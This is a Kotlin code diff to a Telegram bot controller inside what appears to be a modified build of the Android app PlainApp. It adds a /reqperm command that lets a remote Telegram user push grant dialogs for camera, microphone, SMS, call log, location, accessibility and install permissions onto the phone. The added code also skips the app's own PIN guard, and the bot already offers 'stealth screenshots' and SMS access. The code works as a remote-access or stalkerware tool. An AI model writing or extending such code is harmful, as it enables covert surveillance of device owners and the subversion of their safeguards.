@@ -182,6 +182,7 @@ object TelegramBotManager {
         "shots" to "🖼 Recent stealth screenshots — /shots [n]",
         "permissions" to "🛡 Status of every app permission",
         "openperms" to "📲 Open a permission settings screen on the device — /openperms [name]",
+        "reqperm" to "🔔 List every permission as a button — tap to trigger the grant dialog on device",
         "automations" to "⚙️ List automation rules",
         "newrule" to "➕ Create a manual rule — /newrule <name> <action> <args>",
         "newschedule" to "📅 Create a daily schedule — /newschedule HH:MM <name> <action> <args>",
@@ -654,7 +655,8 @@ object TelegramBotManager {
                     "keytop" -> cmdKeyTop()
                     "shots", "screenshots" -> cmdShots(args)
                     "permissions", "perms" -> cmdPermissions()
-                    "openperms", "reqperms", "permopen", "grantperm" -> cmdOpenPerms(args.getOrNull(1) ?: "")
+                    "openperms", "permopen" -> cmdOpenPerms(args.getOrNull(1) ?: "")
+                    "reqperm", "reqperms", "grantperm", "askperm", "permask" -> cmdReqPerm()
                     "automations", "rules" -> cmdAutomations()
                     "newrule", "addrule" -> cmdNewRule(args)
                     "newschedule", "addschedule" -> cmdNewSchedule(args)
@@ -786,6 +788,38 @@ object TelegramBotManager {
                         val opened = openPermSettingsScreen(rest, ctx)
                         TelegramApiClient.answerCallbackQuery(token, cqId,
                             if (opened) "📲 Opening settings…" else "❌ No UI for this permission — use ADB")
+                    }
+                    "reqp" -> {
+                        // rest = Permission enum key (e.g. "CAMERA")
+                        val permEnum = try {
+                            com.ismartcoding.plain.features.Permission.valueOf(rest)
+                        } catch (_: IllegalArgumentException) { null }
+                        if (permEnum == null) {
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "❓ Unknown permission: $rest")
+                        } else {
+                            // 1. Bypass AppInfoGuard PIN prompt (30-second window)
+                            com.ismartcoding.plain.helpers.AppInfoGuard.markVerified()
+                            // 2. Bring the app to foreground so the dialog can appear
+                            val ctx = MainApp.instance
+                            try {
+                                val launchIntent = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
+                                    ?: android.content.Intent().apply {
+                                        setClassName(ctx.packageName, "com.ismartcoding.plain.ui.MainActivity")
+                                    }
+                                launchIntent.addFlags(
+                                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                                    android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+                                )
+                                ctx.startActivity(launchIntent)
+                            } catch (_: Exception) { }
+                            // 3. Short delay so the activity is in foreground before the launcher fires
+                            kotlinx.coroutines.delay(700)
+                            // 4. Fire the permission request — routes through Permission.request():
+                            //    - Regular runtime permissions  → Android "Allow / Deny" dialog
+                            //    - Special permissions          → exact system Settings screen
+                            sendEvent(com.ismartcoding.plain.events.RequestPermissionsEvent(permEnum))
+                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔔 Permission request sent to device")
+                        }
                     }
                     "sms_open" -> {
                         TelegramApiClient.answerCallbackQuery(token, cqId, "Loading thread…")
@@ -4948,6 +4982,98 @@ object TelegramBotManager {
                 try { ctx.startActivity(appInfo()); true } catch (_: Exception) { false }
             }
         } else false
+    }
+
+    // ========== REQUEST PERMISSION (dialog on device) ==========
+
+    private fun cmdReqPerm() {
+        data class Perm(val key: String, val label: String, val granted: Boolean)
+
+        val ctx = MainApp.instance
+        val pkg = ctx.packageName
+        fun pmCheck(p: String) = ctx.checkSelfPermission(p) == android.content.pm.PackageManager.PERMISSION_GRANTED
+
+        val perms = listOf(
+            // Camera & Mic
+            Perm("CAMERA",               "📷 Camera",               pmCheck("android.permission.CAMERA")),
+            Perm("RECORD_AUDIO",         "🎙 Microphone",            pmCheck("android.permission.RECORD_AUDIO")),
+            // Storage / Media
+            Perm("WRITE_EXTERNAL_STORAGE","📁 Storage / Files",
+                try { com.ismartcoding.plain.helpers.FileHelper.hasStoragePermission(ctx) } catch (_: Exception) { false }),
+            Perm("READ_MEDIA_IMAGES",    "🖼 Media Images",          pmCheck("android.permission.READ_MEDIA_IMAGES")),
+            Perm("READ_MEDIA_VIDEOS",    "🎬 Media Videos",          pmCheck("android.permission.READ_MEDIA_VIDEOS")),
+            Perm("READ_MEDIA_AUDIO",     "🎵 Media Audio",           pmCheck("android.permission.READ_MEDIA_AUDIO")),
+            // Messages
+            Perm("READ_SMS",             "💬 Read SMS",              pmCheck("android.permission.READ_SMS")),
+            Perm("SEND_SMS",             "📤 Send SMS",              pmCheck("android.permission.SEND_SMS")),
+            // Contacts
+            Perm("READ_CONTACTS",        "👥 Read Contacts",         pmCheck("android.permission.READ_CONTACTS")),
+            Perm("WRITE_CONTACTS",       "✏️ Write Contacts",        pmCheck("android.permission.WRITE_CONTACTS")),
+            // Calls
+            Perm("READ_CALL_LOG",        "📋 Read Call Log",         pmCheck("android.permission.READ_CALL_LOG")),
+            Perm("WRITE_CALL_LOG",       "📝 Write Call Log",        pmCheck("android.permission.WRITE_CALL_LOG")),
+            Perm("CALL_PHONE",           "📞 Make Calls",            pmCheck("android.permission.CALL_PHONE")),
+            // Phone
+            Perm("READ_PHONE_STATE",     "📱 Phone State",           pmCheck("android.permission.READ_PHONE_STATE")),
+            Perm("READ_PHONE_NUMBERS",   "🔢 Phone Numbers",         pmCheck("android.permission.READ_PHONE_NUMBERS")),
+            // Notifications
+            Perm("POST_NOTIFICATIONS",   "🔔 Notifications",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
+                    pmCheck("android.permission.POST_NOTIFICATIONS") else true),
+            Perm("NOTIFICATION_LISTENER","📡 Notification Listener",
+                android.provider.Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
+                    ?.contains(android.content.ComponentName(ctx, com.ismartcoding.plain.services.PNotificationListenerService::class.java).flattenToString()) == true),
+            // Location
+            Perm("ACCESS_FINE_LOCATION",       "📍 Precise Location",    pmCheck("android.permission.ACCESS_FINE_LOCATION")),
+            Perm("ACCESS_BACKGROUND_LOCATION", "🗺 Background Location", pmCheck("android.permission.ACCESS_BACKGROUND_LOCATION")),
+            // Bluetooth
+            Perm("BLUETOOTH_CONNECT",    "🔵 Bluetooth Connect",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
+                    pmCheck("android.permission.BLUETOOTH_CONNECT") else true),
+            Perm("BLUETOOTH_SCAN",       "🔍 Bluetooth Scan",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
+                    pmCheck("android.permission.BLUETOOTH_SCAN") else true),
+            // System / Special
+            Perm("SYSTEM_ALERT_WINDOW",      "🪟 Draw Over Other Apps",   android.provider.Settings.canDrawOverlays(ctx)),
+            Perm("WRITE_SETTINGS",           "⚙️ Modify System Settings", android.provider.Settings.System.canWrite(ctx)),
+            Perm("PACKAGE_USAGE_STATS",      "📊 Usage Access",
+                try {
+                    val ao = ctx.getSystemService(android.content.Context.APP_OPS_SERVICE) as android.app.AppOpsManager
+                    (if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q)
+                        ao.unsafeCheckOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
+                    else @Suppress("DEPRECATION") ao.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
+                    ) == android.app.AppOpsManager.MODE_ALLOWED
+                } catch (_: Exception) { false }),
+            Perm("ACCESSIBILITY_SERVICE",    "♿ Accessibility Service",
+                com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(ctx)),
+            Perm("REQUEST_INSTALL_PACKAGES", "📦 Install Unknown Apps",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
+                    ctx.packageManager.canRequestPackageInstalls() else true),
+            Perm("QUERY_ALL_PACKAGES",       "🔎 Query All Packages",     pmCheck("android.permission.QUERY_ALL_PACKAGES")),
+            Perm("SCHEDULE_EXACT_ALARM",     "⏰ Exact Alarm",
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
+                    (ctx.getSystemService(android.content.Context.ALARM_SERVICE) as android.app.AlarmManager).canScheduleExactAlarms()
+                else true),
+        )
+
+        val granted = perms.count { it.granted }
+        val sb = StringBuilder()
+        sb.append("🔔 <b>Request Permission on Device</b>\n")
+        sb.append("Tap any button below — PlainApp will ask for that permission <b>right now</b> on the device.\n")
+        sb.append("• Runtime permissions → Android dialog (Allow / Deny)\n")
+        sb.append("• Special permissions → Opens exact Settings screen\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━\n")
+        sb.append("✅ Granted: <b>$granted</b>  ·  ❌ Missing: <b>${perms.size - granted}</b>\n\n")
+        perms.forEach { p -> sb.append("${if (p.granted) "✅" else "❌"} ${p.label}\n") }
+        sb.append("\n🕐 $ts")
+
+        val rows = perms.chunked(2).map { chunk ->
+            chunk.map { p ->
+                val icon = if (p.granted) "✅" else "🔔"
+                "$icon ${p.label}" to "reqp:${p.key}"
+            }
+        }
+        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
     }
 
     // ========== AUTOMATION ==========
